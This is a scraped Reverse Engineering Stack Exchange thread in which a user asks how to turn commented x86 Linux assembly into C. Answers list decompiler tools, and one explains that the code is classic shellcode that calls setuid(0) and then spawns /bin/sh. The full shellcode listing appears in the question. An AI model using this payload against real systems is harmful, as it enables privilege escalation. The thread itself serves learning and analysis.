{
    "title": "Converting assembly code to c",
    "link": "https://reverseengineering.stackexchange.com/questions/3748/converting-assembly-code-to-c",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I have the following assembly code over Linux distro:</p>\n<pre><code># using the .data section for write permission\n# instead of .text section\n.section .data\n.globl _start\n\n_start:\n     # displaying some characters for watermarking :-)\n     xor %eax,%eax      # clear eax by setting eax to 0\n     xor %ebx,%ebx      # clear ebx by setting ebx to 0\n     xor %edx,%edx      # clear edx by setting edx to 0\n     push %ebx          # push ebx into the stack, base pointer\n                        # for the stack frame\n     push $0xa696e55    # push U-n-i characters\n     push $0x4d555544   # push M-U-U-D characters\n     push $0x414d4841   # push A-M-H-A characters\n     movl  %esp,%ecx    # move the sp to ecx\n     movb  $0xf,%dl     # move 15 to dl (low d), it is the string length,\n                        # notice the use of movb - move byte, this is to avoid null\n     movb  $0x4,%al     # move 4 to al (low l),\n                        # 4 is system call number for\n                        # write(int fd, char *str, int len)\n     int  $0x80         # call kernel/syscall\n\n     # setuid(0)\n     xor %eax,%eax      # clear eax by setting eax to 0\n     xor %ebx,%ebx      # clear ebx by setting ebx to 0\n     xor %ecx,%ecx      # clear ecx by setting ecx to 0\n     movb $0x17,%al     # move 0x17 into al - setuid(0)\n     int $0x80          # call kernel/syscall\n\n     jmp do_call        # jump to get the address with the call trick\n\njmp_back:\n     pop %ebx           # ebx (base pointer=stack frame pointer) has \n                        # the address of our string, use it to index\n     xor %eax,%eax      # clear eax by setting eax to 0\n     movb %al,7(%ebx)   # put a null at the N or shell[7]\n     movl %ebx,8(%ebx)  # put the address of our string (in ebx) into shell[8]\n\n     movl %eax,12(%ebx) # put the null at shell[12] our string now looks something like\n                        # \"/bin/sh\\0(*ebx)(*0000)\"\n     xor %eax,%eax      # clear eax by setting eax to 0\n     movb $11,%al       # put 11 which is execve\n\n# syscall number into al\n     leal 8(%ebx),%ecx  # put the address of XXXX i.e. (*ebx) into ecx\n     leal 12(%ebx),%edx # put the address of YYYY i.e. (*0000) into edx\n     int $0x80          # call kernel/syscall\n\ndo_call:\n     call jmp_back\n\nshell:\n     .ascii \"/bin/shNXXXXYYYY\"\n</code></pre>\n<p>How is it possible to convert it to C code?</p>\n</div>",
    "votes": "18",
    "answers": 4,
    "views": "182k",
    "tags": [
        "disassembly",
        "decompilation",
        "linux",
        "c",
        "exploit"
    ],
    "user": "MLSC",
    "time": "Mar 2, 2014 at 12:13",
    "comments": [
        {
            "user": "0xC0000022L",
            "text": "<span class=\"comment-copy\">Looks like a crackme or CTF. So we should do your homework? :) ... I'm sure someone will.</span>",
            "time": null
        },
        {
            "user": "perror",
            "text": "<span class=\"comment-copy\">Come on MortezaLSC, this all commented and fully understandable... RTFM !</span>",
            "time": null
        },
        {
            "user": "MLSC",
            "text": "<span class=\"comment-copy\">@0xC0000022L I found it...thank you for your help</span>",
            "time": null
        },
        {
            "user": "atErik",
            "text": "<span class=\"comment-copy\">User:pank4j's answer in above, does not include the below decompiler, it can also do <code>Assembly</code>-source-code to <code>C</code> code conversion: <a href=\"https://sourceforge.net/projects/boomerang/\" rel=\"nofollow noreferrer\">Boomerang</a> (decompiler)</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Here is the list of few decompilation tools / resources that you may find useful.</p>\n<ul>\n<li><a href=\"https://www.hex-rays.com/products/decompiler/\" rel=\"noreferrer\">IDA Pro + Hex-Rays</a> decompiler</li>\n<li><a href=\"https://www.hopperapp.com\" rel=\"noreferrer\">Hopper disassembler</a> (has a decompiler)</li>\n<li><a href=\"https://onlinedisassembler.com\" rel=\"noreferrer\">ODA</a> (Online Disassembler)</li>\n<li><a href=\"https://retdec.com\" rel=\"noreferrer\">Retargetable Decompiler</a></li>\n<li><a href=\"https://sourceforge.net/projects/boomerang/\" rel=\"noreferrer\">Boomerang</a> (decompiler)</li>\n</ul>\n</div>",
            "votes": "24",
            "user": "0xC0000022L",
            "time": "Oct 21, 2020 at 20:37",
            "is_accepted": true,
            "comments": [
                {
                    "user": "MLSC",
                    "text": "<span class=\"comment-copy\">Are I able to decompile output of <code>as test.s -o test</code> to a C code(command line)?</span>",
                    "time": null
                },
                {
                    "user": "pank4j",
                    "text": "<span class=\"comment-copy\">That depends. If test.s is generated from a c compiler such as cl.exe or gcc, chances are that you can get back the C code that is close to the original. If it is hand crafted assembly code, the decompiled code may not be any useful than the assembly itself.</span>",
                    "time": null
                },
                {
                    "user": "MLSC",
                    "text": "<span class=\"comment-copy\">ok..I am using gcc...How is it possible? thanks</span>",
                    "time": null
                },
                {
                    "user": "pank4j",
                    "text": "<span class=\"comment-copy\">Try opening the assembled binary in IDA Pro or Hopper.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>You need decompiler. I'd compile it and use <a href=\"http://decompiler.fit.vutbr.cz/decompilation/\" rel=\"noreferrer\">retargetable decompiler</a>\nIt is easiest way to do this specific task.</p>\n</div>",
            "votes": "6",
            "user": "w s",
            "time": "Feb 24, 2014 at 8:27",
            "is_accepted": false,
            "comments": []
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I'd just like to add what this code actually does, since it's rather simple. It is designed to be used as a shellcode. A relatively standard one. What it does is write something to AHMADUMinU to STDIN (?) which gets printed on the screen and then proceeds to execute /bin/sh via syscall 11. It's fairly easy to follow since it's heavily commented. \nI am mentioning all of this because you won't be able to see many of the details in \"decompiled code\" which would look somethign like this:</p>\n<pre><code>main(){\nwrite(0,\"AHMA...\",15);\nexecve(\"/bin/sh\",NULL,NULL);\n}\n</code></pre>\n<p>There is one interesting bit (old shellcoding trick). The shellcode needs to NULL terminate the \"/bin/sh\" string which will be somewhere on the stack. For that purpose, it needs to get its address. It does that by making two calls. Calls will make new stack frames, at which point it can just pop the saved stack frame. </p>\n</div>",
            "votes": "4",
            "user": "0xea",
            "time": "Feb 24, 2014 at 10:34",
            "is_accepted": false,
            "comments": [
                {
                    "user": "broadway",
                    "text": "<span class=\"comment-copy\">It predates shellcode as well. DOS viruses did the same thing and typically referred to it as a \"delta offset\".</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>There's also <a href=\"https://github.com/frranck/asm2c\" rel=\"nofollow noreferrer\">asm2c</a> that works on assembly source code instead of executables or objects files.</p>\n<blockquote>\n<p>Tool to convert DOS Assembly code to C code Edit</p>\n</blockquote>\n</div>",
            "votes": "3",
            "user": "franck",
            "time": "Mar 19, 2017 at 8:31",
            "is_accepted": false,
            "comments": []
        }
    ]
}